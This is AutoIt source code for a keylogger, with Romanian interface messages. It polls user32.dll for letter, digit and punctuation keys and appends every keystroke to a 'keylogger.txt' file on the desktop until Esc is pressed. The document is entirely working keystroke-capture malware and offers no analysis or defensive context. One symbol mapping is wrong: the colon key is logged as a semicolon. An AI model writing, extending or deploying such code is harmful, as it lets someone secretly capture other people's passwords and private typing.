#include <File.au3>
#include <Misc.au3>
#include <FileConstants.au3>

Func killProgram()
   MsgBox(0, "Exit", "Keylogger-ul se inchide...")
   Exit
EndFunc

HotKeySet("{esc}", "killProgram")

Local $filePath
Local $dllHandle
Local $fileHandle


$filePath  = @DesktopDir & "\keylogger.txt"
If FileExists($filePath) Or _FileCreate($filePath) Then
   $fileHandle  = FileOpen($filePath, $FO_APPEND)
   if $fileHandle = 1 Then
	  $dllHandle = DllOpen("user32.dll")
	  if $dllHandle <> -1 Then
		 FileWrite($fileHandle, @CRLF & @CRLF & @CRLF & @CRLF)
		 While True

			;;;;;;;;;;;;
			;;        ;;
	  ;;;;;;;; ALTELE ;;
			;;        ;;
			;;;;;;;;;;;;

			; enter
			Local $ok = False
			While _IsPressed("0D", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, @CRLF)
				  $ok = True
			   EndIf
			WEnd
			; space
			Local $ok = False
			While _IsPressed("20", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, " ")
				  $ok = True
			   EndIf
			WEnd
			; semicolon
			Local $ok = False
			While _IsPressed("BA", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, ";")
				  $ok = True
			   EndIf
			WEnd
			; equals
			Local $ok = False
			While _IsPressed("BB", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "=")
				  $ok = True
			   EndIf
			WEnd
			; comma
			Local $ok = False
			While _IsPressed("BC", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, ",")
				  $ok = True
			   EndIf
			WEnd
			; dash
			Local $ok = False
			While _IsPressed("BD", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "-")
				  $ok = True
			   EndIf
			WEnd
			; period
			Local $ok = False
			While _IsPressed("BE", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, ".")
				  $ok = True
			   EndIf
			WEnd
			; slash
			Local $ok = False
			While _IsPressed("BF", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "/")
				  $ok = True
			   EndIf
			WEnd
			; `
			Local $ok = False
			While _IsPressed("C0", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "`")
				  $ok = True
			   EndIf
			WEnd
			; [
			Local $ok = False
			While _IsPressed("DB", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "[")
				  $ok = True
			   EndIf
			WEnd
			; backslash
			Local $ok = False
			While _IsPressed("DC", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "\")
				  $ok = True
			   EndIf
			WEnd
			; ]
			Local $ok = False
			While _IsPressed("DD", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "]")
				  $ok = True
			   EndIf
			WEnd

			;;;;;;;;;;;;
			;;        ;;
	  ;;;;;;;; SEMNE  ;;
			;;        ;;
			;;;;;;;;;;;;

			; )
			Local $ok = False
			While _IsPressed("30", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, ")")
				  $ok = True
			   EndIf
			WEnd
			; !
			Local $ok = False
			While _IsPressed("31", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "!")
				  $ok = True
			   EndIf
			WEnd
			; @
			Local $ok = False
			While _IsPressed("32", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "@")
				  $ok = True
			   EndIf
			WEnd
			; #
			Local $ok = False
			While _IsPressed("33", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "#")
				  $ok = True
			   EndIf
			WEnd
			; $
			Local $ok = False
			While _IsPressed("34", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "$")
				  $ok = True
			   EndIf
			WEnd
			; %
			Local $ok = False
			While _IsPressed("35", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "%")
				  $ok = True
			   EndIf
			WEnd
			; ^
			Local $ok = False
			While _IsPressed("36", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "^")
				  $ok = True
			   EndIf
			WEnd
			; &
			Local $ok = False
			While _IsPressed("37", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "&")
				  $ok = True
			   EndIf
			WEnd
			; *
			Local $ok = False
			While _IsPressed("38", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "*")
				  $ok = True
			   EndIf
			WEnd
			; (
			Local $ok = False
			While _IsPressed("39", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "(")
				  $ok = True
			   EndIf
			WEnd
			; _
			Local $ok = False
			While _IsPressed("BD", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "_")
				  $ok = True
			   EndIf
			WEnd
			; +
			Local $ok = False
			While _IsPressed("BB", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "+")
				  $ok = True
			   EndIf
			WEnd
			; ?
			Local $ok = False
			While _IsPressed("BF", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "?")
				  $ok = True
			   EndIf
			WEnd
			; >
			Local $ok = False
			While _IsPressed("BE", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, ">")
				  $ok = True
			   EndIf
			WEnd
			; <
			Local $ok = False
			While _IsPressed("BC", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "<")
				  $ok = True
			   EndIf
			WEnd
			; :
			Local $ok = False
			While _IsPressed("BA", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, ";")
				  $ok = True
			   EndIf
			WEnd
			; {
			Local $ok = False
			While _IsPressed("DB", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "{")
				  $ok = True
			   EndIf
			WEnd
			; }
			Local $ok = False
			While _IsPressed("DD", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "}")
				  $ok = True
			   EndIf
			WEnd
			; |
			Local $ok = False
			While _IsPressed("DC", $dllHandle) And _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "|")
				  $ok = True
			   EndIf
			WEnd

			;;;;;;;;;;;;
			;;        ;;
	  ;;;;;;;; CIFRE  ;;
			;;        ;;
			;;;;;;;;;;;;

			; 0
			Local $ok = False
			While _IsPressed("30", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "0")
				  $ok = True
			   EndIf
			WEnd
			; 1
			Local $ok = False
			While _IsPressed("31", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "1")
				  $ok = True
			   EndIf
			WEnd
			; 2
			Local $ok = False
			While _IsPressed("32", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "2")
				  $ok = True
			   EndIf
			WEnd
			; 3
			Local $ok = False
			While _IsPressed("33", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "3")
				  $ok = True
			   EndIf
			WEnd
			; 4
			Local $ok = False
			While _IsPressed("34", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "4")
				  $ok = True
			   EndIf
			WEnd
			; 5
			Local $ok = False
			While _IsPressed("35", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "5")
				  $ok = True
			   EndIf
			WEnd
			; 6
			Local $ok = False
			While _IsPressed("36", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "6")
				  $ok = True
			   EndIf
			WEnd
			; 7
			Local $ok = False
			While _IsPressed("37", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "7")
				  $ok = True
			   EndIf
			WEnd
			; 8
			Local $ok = False
			While _IsPressed("38", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "8")
				  $ok = True
			   EndIf
			WEnd
			; 9
			Local $ok = False
			While _IsPressed("39", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "9")
				  $ok = True
			   EndIf
			WEnd

			;;;;;;;;;;;;
			;;        ;;
	  ;;;;;;;; LITERE ;;
			;;        ;;
			;;;;;;;;;;;;

			; a
			Local $ok = False
			While _IsPressed("41", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "a")
				  $ok = True
			   EndIf
			WEnd
			; b
			Local $ok = False
			While _IsPressed("42", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "b")
				  $ok = True
			   EndIf
			WEnd
			; c
			Local $ok = False
			While _IsPressed("43", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "c")
				  $ok = True
			   EndIf
			WEnd
			; d
			Local $ok = False
			While _IsPressed("44", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "d")
				  $ok = True
			   EndIf
			WEnd
			; e
			Local $ok = False
			While _IsPressed("45", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "e")
				  $ok = True
			   EndIf
			WEnd
			; f
			Local $ok = False
			While _IsPressed("46", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "f")
				  $ok = True
			   EndIf
			WEnd
			; g
			Local $ok = False
			While _IsPressed("47", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "g")
				  $ok = True
			   EndIf
			WEnd
			; h
			Local $ok = False
			While _IsPressed("48", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "h")
				  $ok = True
			   EndIf
			WEnd
			; i
			Local $ok = False
			While _IsPressed("49", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "i")
				  $ok = True
			   EndIf
			WEnd
			; j
			Local $ok = False
			While _IsPressed("4A", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "j")
				  $ok = True
			   EndIf
			WEnd
			; k
			Local $ok = False
			While _IsPressed("4B", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "k")
				  $ok = True
			   EndIf
			WEnd
			; l
			Local $ok = False
			While _IsPressed("4C", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "l")
				  $ok = True
			   EndIf
			WEnd
			; m
			Local $ok = False
			While _IsPressed("4D", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "m")
				  $ok = True
			   EndIf
			WEnd
			; n
			Local $ok = False
			While _IsPressed("4E", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "n")
				  $ok = True
			   EndIf
			WEnd
			; o
			Local $ok = False
			While _IsPressed("4F", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "o")
				  $ok = True
			   EndIf
			WEnd
			; p
			Local $ok = False
			While _IsPressed("50", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "p")
				  $ok = True
			   EndIf
			WEnd
			; q
			Local $ok = False
			While _IsPressed("51", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "q")
				  $ok = True
			   EndIf
			WEnd
			; r
			Local $ok = False
			While _IsPressed("52", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "r")
				  $ok = True
			   EndIf
			WEnd
			; s
			Local $ok = False
			While _IsPressed("53", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "s")
				  $ok = True
			   EndIf
			WEnd
			; t
			Local $ok = False
			While _IsPressed("54", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "t")
				  $ok = True
			   EndIf
			WEnd
			; u
			Local $ok = False
			While _IsPressed("55", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "u")
				  $ok = True
			   EndIf
			WEnd
			; v
			Local $ok = False
			While _IsPressed("56", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "v")
				  $ok = True
			   EndIf
			WEnd
			; w
			Local $ok = False
			While _IsPressed("57", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "w")
				  $ok = True
			   EndIf
			WEnd
			; x
			Local $ok = False
			While _IsPressed("58", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "x")
				  $ok = True
			   EndIf
			WEnd
			; y
			Local $ok = False
			While _IsPressed("59", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "y")
				  $ok = True
			   EndIf
			WEnd
			; z
			Local $ok = False
			While _IsPressed("5A", $dllHandle) And Not _IsPressed("10", $dllHandle)
			   If $ok = False Then
				  FileWrite($fileHandle, "z")
				  $ok = True
			   EndIf
			WEnd
			Local $ok = False
		 WEnd
		 FileClose($fileHandle)
		 DllClose($dllHandle)
	  Else
		 MsgBox(0, "Error!", "Nu se poate deschide un DLL")
	  EndIf
   Else
	  MsgBox(0, "Error!", "Nu se poate deschide fisierul keylogger.txt")
   EndIf
Else
   MsgBox(0, "Error!", "Nu se poate creea fisierul keylogger.txt")
EndIf